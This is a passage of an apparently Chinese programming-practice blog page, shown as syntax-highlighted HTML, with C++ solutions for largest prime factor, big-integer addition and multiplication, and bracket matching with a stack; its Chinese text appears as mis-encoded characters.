class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="keyword">bool</span> isp[MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n, vector&lt;<span class="keyword">int</span>&gt; &amp;primes)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!isp[i])&#123;</span><br><span class="line">primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="keyword">int</span> p = primes[j];</span><br><span class="line"><span class="keyword">if</span>(p * i &gt; n)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">isp[p*i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(i % p == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deal_str</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = s.<span class="built_in">size</span>(), r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp &gt;= <span class="number">0</span> &amp;&amp; tmp &lt;= <span class="number">9</span>)&#123;</span><br><span class="line">r = r*<span class="number">10</span> + tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="keyword">int</span> n = <span class="built_in">deal_str</span>(s);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m = <span class="built_in">sqrt</span>(n);</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; primes;</span><br><span class="line"><span class="built_in">init</span>(m, primes);</span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="keyword">while</span>(n % primes[j] == <span class="number">0</span>)&#123;</span><br><span class="line">n /= primes[j];</span><br><span class="line"><span class="keyword">if</span>(primes[j] &gt; p) p = primes[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n != <span class="number">1</span> &amp;&amp; n &gt; p) p = n;</span><br><span class="line">cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç²¾åº¦"><a href="#ç²¾åº¦" class="headerlink" title="ç²¾åº¦"></a>ç²¾åº¦</h1><h2 id="å¤§æ•´æ•°åŠ æ³•"><a href="#å¤§æ•´æ•°åŠ æ³•" class="headerlink" title="å¤§æ•´æ•°åŠ æ³•"></a>å¤§æ•´æ•°åŠ æ³•</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b)  (a &gt; b ? a:b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a, b)  (a &lt; b ? a:b)</span></span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">add</span><span class="params">(string a, string b)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n1 = a.<span class="built_in">size</span>(), n2 = b.<span class="built_in">size</span>();</span><br><span class="line">string r;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n2; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = (a[i] - <span class="string">&#x27;0&#x27;</span>) + (b[i] - <span class="string">&#x27;0&#x27;</span>) + k;</span><br><span class="line">r += (tmp)% <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">k = tmp / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = n2; i &lt; n1; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = (a[i] - <span class="string">&#x27;0&#x27;</span>) + k;</span><br><span class="line">r += tmp % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">k = tmp / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(k) r += k+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">string  r;</span><br><span class="line"><span class="built_in">reverse</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">reverse</span>(b.<span class="built_in">begin</span>(), b.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">if</span>(a.<span class="built_in">size</span>() &gt; b.<span class="built_in">size</span>())&#123;</span><br><span class="line">r = <span class="built_in">add</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r = <span class="built_in">add</span>(b, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">reverse</span>(r.<span class="built_in">begin</span>(), r.<span class="built_in">end</span>());</span><br><span class="line">cout &lt;&lt; r &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤§æ•´æ•°ä¹˜æ³•"><a href="#å¤§æ•´æ•°ä¹˜æ³•" class="headerlink" title="å¤§æ•´æ•°ä¹˜æ³•"></a>å¤§æ•´æ•°ä¹˜æ³•</h2><p>å…ˆå˜æˆæ•°å­—çš„æ•°ç»„ï¼Œå†ç®—ï¼Œç„¶åè¿›ä½</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="built_in">reverse</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">reverse</span>(b.<span class="built_in">begin</span>(), b.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">int</span> aa[<span class="number">105</span>], bb[<span class="number">105</span>], r[<span class="number">210</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">aa[i] = a[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">bb[i] = b[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">r[i+j] += aa[i] * bb[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">2</span>*n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line">r[i] += r[i<span class="number">-1</span>] / <span class="number">10</span>;</span><br><span class="line">r[i<span class="number">-1</span>] %= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!r[len]) len--;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">cout &lt;&lt; r[i];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h1><h2 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h2><p><code>#include&lt;stack\&gt; ç„¶åå¯ä»¥ç›´æ¥ç”¨äº†ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰.push .pop .top .empty</code></p><h3 id="æ‹¬å·åŒ¹é…"><a href="#æ‹¬å·åŒ¹é…" class="headerlink" title="æ‹¬å·åŒ¹é…"></a>æ‹¬å·åŒ¹é…</h3><h5 id="é¢˜ç›®æè¿°-9"><a href="#é¢˜ç›®æè¿°-9" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å‡è®¾è¡¨è¾¾å¼ä¸­å…è®¸åŒ…å«ä¸¤ç§æ‹¬å·:åœ†æ‹¬å·å’Œæ–¹æ‹¬å·ã€‚ç¼–å†™ä¸€ä¸ªç®—æ³•åˆ¤æ–­è¡¨è¾¾å¼ä¸­çš„æ‹¬å·æ˜¯å¦æ­£ç¡®é…å¯¹ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-7"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-7" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-9"><a href="#è¾“å…¥æè¿°-9" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”±æ‹¬å·æ„æˆçš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«â€ï¼ˆâ€œã€â€ï¼‰â€œã€â€<span class="selector-attr">[â€œå’Œâ€]</span>â€œã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-9"><a href="#è¾“å‡ºæè¿°-9" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœåŒ¹é…è¾“å‡º<span class="keyword">YES</span>ï¼Œå¦åˆ™è¾“å‡º<span class="keyword">NO</span>ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">stack&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">char</span> now = st.<span class="built_in">top</span>();</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>&amp;&amp;now == <span class="string">&#x27;(&#x27;</span> || s[i] == <span class="string">&#x27;]&#x27;</span>&amp;&amp;now == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¬å·çš„åŒ¹é…"><a href="#æ‹¬å·çš„åŒ¹é…" class="headerlink" title="æ‹¬å·çš„åŒ¹é…"></a>æ‹¬å·çš„åŒ¹é…</h3><h5 id="é¢˜ç›®æè¿°-10"><a href="#é¢˜ç›®æè¿°-10" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p><code>é¢˜æ„æè¿°ï¼š åœ¨ç®—æœ¯è¡¨è¾¾å¼ä¸­ï¼Œé™¤äº†åŠ ã€å‡ã€ä¹˜ã€é™¤ç­‰è¿ç®—å¤–ï¼Œå¾€å¾€è¿˜æœ‰æ‹¬å·ã€‚åŒ…æ‹¬æœ‰å¤§æ‹¬å·&#123;&#125;ï¼Œä¸­æ‹¬å·[]ï¼Œå°æ‹¬å·()ï¼Œå°–æ‹¬å·&lt;&gt;ç­‰ã€‚ å¯¹äºæ¯ä¸€å¯¹æ‹¬å·ï¼Œå¿…é¡»å…ˆå·¦è¾¹æ‹¬å·ï¼Œç„¶åå³è¾¹æ‹¬å·ï¼›å¦‚æœæœ‰å¤šä¸ªæ‹¬å·ï¼Œåˆ™æ¯ç§ç±»å‹çš„å·¦æ‹¬å·å’Œå³æ‹¬å·çš„ä¸ªæ•°å¿…é¡»ç›¸ç­‰ï¼›å¯¹äºå¤šé‡æ‹¬å·çš„æƒ…å½¢ï¼ŒæŒ‰è¿ç®—è§„åˆ™ï¼Œä»å¤–åˆ°å†…çš„æ‹¬å·åµŒå¥—é¡ºåºä¸ºï¼šå¤§æ‹¬å·-&gt;ä¸­æ‹¬å·-&gt;å°æ‹¬å·-&gt;å°–æ‹¬å·ã€‚ä¾‹å¦‚ï¼Œ&#123;[()]&#125;ï¼Œ&#123;()&#125;,&#123;&#123;&#125;&#125;ä¸ºä¸€ä¸ªåˆæ³•çš„è¡¨è¾¾å¼ï¼Œè€Œ([&#123;&#125;])ï¼Œ&#123;([])&#125;,[&#123;&lt;&gt;&#125;]éƒ½æ˜¯éæ³•çš„ã€‚</code></p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-8"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-8" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-10"><a href="#è¾“å…¥æè¿°-10" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°<span class="built_in">n</span>ï¼ˆ<span class="number">1</span>â‰¤<span class="built_in">n</span>â‰¤<span class="number">100</span>ï¼‰ï¼Œæ¥ä¸‹æ¥æœ‰<span class="built_in">n</span>è¡Œä»…ç”±ä¸Šè¿°å››ç±»æ‹¬å·ç»„æˆçš„æ‹¬å·è¡¨è¾¾å¼ã€‚ç¬¬i+<span class="number">1</span>è¡Œè¡¨ç¤ºç¬¬iä¸ªè¡¨è¾¾å¼ã€‚æ¯ä¸ªæ‹¬å·è¡¨è¾¾å¼çš„é•¿åº¦ä¸è¶…è¿‡<span class="number">255</span>ã€‚</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é¢˜æ¯”è¾ƒåƒï¼Œåªä¸è¿‡ç»™æ‹¬å·ä¹‹é—´åŠ å…¥äº†ä¼˜å…ˆçº§ï¼Œåˆ¤æ–­ä¸€ä¸‹å°±è¡Œ</p><h6 id="è¾“å‡ºæè¿°-10"><a href="#è¾“å‡ºæè¿°-10" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¾“å‡ºæ–‡ä»¶ä¸­æœ‰<span class="built_in">N</span>è¡Œï¼Œå…¶ä¸­ç¬¬<span class="built_in">I</span>è¡Œå¯¹åº”ç¬¬<span class="built_in">I</span>ä¸ªè¡¨è¾¾å¼çš„åˆæ³•æ€§ï¼Œåˆæ³•è¾“å‡º<span class="variable">YES</span>ï¼Œéæ³•è¾“å‡º<span class="variable">NO</span>ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">string s;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">stack&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">char</span> now = st.<span class="built_in">top</span>();</span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; (s[j] == <span class="string">&#x27;(&#x27;</span> || s[j] == <span class="string">&#x27;[&#x27;</span> || s[j] == <span class="string">&#x27;&#123;&#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;(&#x27;</span> &amp;&amp; (s[j] == <span class="string">&#x27;&#123;&#x27;</span> || s[j] == <span class="string">&#x27;[&#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;[&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&#125;&#x27;</span> || now == <span class="string">&#x27;[&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;]&#x27;</span> ||now == <span class="string">&#x27;(&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;)&#x27;</span> ||now == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&gt;&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¬å·åŒ¹é…é—®é¢˜"><a href="#æ‹¬å·åŒ¹é…é—®é¢˜" class="headerlink" title="æ‹¬å·åŒ¹é…é—®é¢˜"></a>æ‹¬å·åŒ¹é…é—®é¢˜</h3><h5 id="é¢˜ç›®æè¿°-11"><a href="#é¢˜ç›®æè¿°-11" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>åœ¨æŸä¸ªå­—ç¬¦ä¸²ï¼ˆé•¿åº¦ä¸è¶…è¿‡100ï¼‰ä¸­æœ‰å·¦æ‹¬å·ã€å³æ‹¬å·å’Œå¤§å°å†™å­—æ¯ï¼›è§„å®šï¼ˆä¸å¸¸è§çš„ç®—æ•°å¼å­ä¸€æ ·ï¼‰ä»»ä½•ä¸€ä¸ªå·¦æ‹¬å·éƒ½ä»å†…åˆ°å¤–ä¸åœ¨å®ƒå³è¾¹ä¸”è·ç¦»æœ€è¿‘çš„å³æ‹¬å·åŒ¹é…ã€‚å†™ä¸€ä¸ªç¨‹åºï¼Œæ‰¾åˆ°æ— æ³•åŒ¹é…çš„å·¦æ‹¬å·å’Œå³æ‹¬å·ï¼Œè¾“å‡ºåŸæ¥å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨ä¸‹ä¸€è¡Œæ ‡å‡ºä¸èƒ½åŒ¹é…çš„æ‹¬å·ã€‚ä¸èƒ½åŒ¹é…çš„å·¦æ‹¬å·ç”¨â€$â€æ ‡æ³¨,ä¸èƒ½åŒ¹é…çš„å³æ‹¬å·ç”¨â€?â€æ ‡æ³¨ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-9"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-9" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-11"><a href="#è¾“å…¥æè¿°-11" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…æ‹¬å¤šç»„æ•°æ®ï¼Œæ¯ç»„æ•°æ®ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåªåŒ…å«å·¦å³æ‹¬å·å’Œå¤§å°å†™å­—æ¯ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡<span class="number">100</span>ã€‚</span><br><span class="line">æ³¨æ„ï¼šcin.<span class="built_in">getline</span>(str,<span class="number">100</span>)æœ€å¤šåªèƒ½è¾“å…¥<span class="number">99</span>ä¸ªå­—ç¬¦ï¼</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-11"><a href="#è¾“å‡ºæè¿°-11" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 